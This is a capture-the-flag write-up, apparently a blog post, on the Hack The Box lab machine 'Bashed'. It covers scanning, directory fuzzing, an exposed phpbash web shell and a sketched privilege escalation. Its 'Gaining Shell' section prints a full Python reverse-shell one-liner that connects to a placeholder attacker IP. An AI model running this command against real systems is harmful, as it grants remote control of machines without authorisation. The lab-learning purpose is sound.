---
title: Bashed
date: 2020-11-28 21:30:30 +/-TTTT
categories: [CTF, hackthebox]
tags: [phpbash, sudo, kernel]
---

![infocard](/assets/htb/bashed/infocard.png)

bashed is easy box 

## Enumeration

As always we start with Nmap.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET
  Nmap scan report for 10.10.10.68
  Host is up (0.073s latency).
  Not shown: 999 closed ports
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Arrexels Development Site

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
  ```
  
on the webpage, nothing interesting was found. next we find out directories using ffuf

![ffuf](/assets/htb/bashed/ffuf.png)

`/dev` looks interesting let's check out that

![dev](/assets/htb/bashed/dev.png)

when we navigate to `phpbash.php` we get shell.

![webshell](/assets/htb/bashed/webshell.png)

## Gaining Shell

we use python to get reverse shell.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

we get shell as www-data.on this box we have two user scriptmanager and arrexel,in arrexel home directory we found user flag

![user](/assets/htb/bashed/user.png)

## Gaining Root

we can run everything as scriptmanager using sudo. so lets first escalate privs to scriptmanager.

When we run `uname` with `-a` flag we see that machine is running outdate kernel version 4.4
after bit google search we found kernel exploit for this version. but gcc in not installed on box so we have to compile this on our machine and then transfer it to victim.

![root](/assets/htb/bashed/root.png)

